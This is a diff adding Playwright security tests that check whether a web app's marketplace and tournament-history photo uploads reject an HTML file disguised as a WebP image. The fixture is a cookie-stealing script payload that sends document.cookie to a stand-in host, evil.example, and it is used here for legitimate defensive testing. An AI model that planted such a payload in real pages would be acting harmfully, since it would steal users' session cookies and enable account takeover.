@@ -202,6 +202,57 @@ test.describe('Security: marketplace IDOR', () => {
   });
 });
 
+test.describe('Security: malicious file upload rejection', () => {
+  // A real image file starts with a specific magic-number byte
+  // sequence (see server/lib/imageValidation.ts detectImageType) - a
+  // plain text/HTML payload never matches any of them, regardless of
+  // what filename or Content-Type the client claims for it. Every one
+  // of these attempts declares itself as a legitimate image on the
+  // wire (name "evil.webp", mimeType "image/webp") while the actual
+  // bytes are an HTML/script payload - exactly what an attacker
+  // uploading a disguised file would send.
+  const disguisedHtmlPayload = Buffer.from('<script>document.location="https://evil.example/steal?c="+document.cookie</script>');
+
+  test('@smoke SEC-007 Marketplace photo upload rejects a disguised non-image file', async ({ page }) => {
+    await registerPlayer(page);
+    const itemRes = await page.request.post('/api/profile/marketplace', {
+      data: { title: `Upload test item ${Date.now()}`, price: '10', condition: 'Used', location: 'Sydney, NSW' },
+    });
+    const item = await itemRes.json();
+
+    const uploadRes = await page.request.post(`/api/profile/marketplace/${item.id}/photos`, {
+      multipart: {
+        file: { name: 'evil.webp', mimeType: 'image/webp', buffer: disguisedHtmlPayload },
+      },
+    });
+    expect(uploadRes.status()).toBe(400);
+  });
+
+  test('SEC-008 Tournament history photo upload rejects a disguised non-image file', async ({ page }) => {
+    await registerPlayer(page);
+    const entryRes = await page.request.post('/api/profile/tournament-history', {
+      data: { name: `Upload test tournament ${Date.now()}`, location: 'Sydney, NSW', date: '2026-01-01' },
+    });
+    const entry = await entryRes.json();
+
+    const uploadRes = await page.request.post(`/api/profile/tournament-history/${entry.id}/photos`, {
+      multipart: {
+        file: { name: 'evil.webp', mimeType: 'image/webp', buffer: disguisedHtmlPayload },
+      },
+    });
+    // This route's error path currently surfaces any thrown Error as a
+    // generic 500 rather than a mapped 400 (see the route's plain
+    // catch(e) { next(e) }) - the one thing that actually matters for
+    // this test is that it's rejected, not stored as a "photo".
+    expect(uploadRes.ok()).toBeFalsy();
+
+    const stillThereRes = await page.request.get(`/api/profile/tournament-history?userId=${entry.userId}`);
+    const entries = await stillThereRes.json();
+    const stored = entries.find((e: any) => e.id === entry.id);
+    expect(stored?.photos ?? []).toHaveLength(0);
+  });
+});
+
 test.describe('Security: tournament history ownership (regression - already correct, locking it in)', () => {
   async function createTournamentEntry(page: import('@playwright/test').Page, name: string) {
     const res = await page.request.post('/api/profile/tournament-history', {
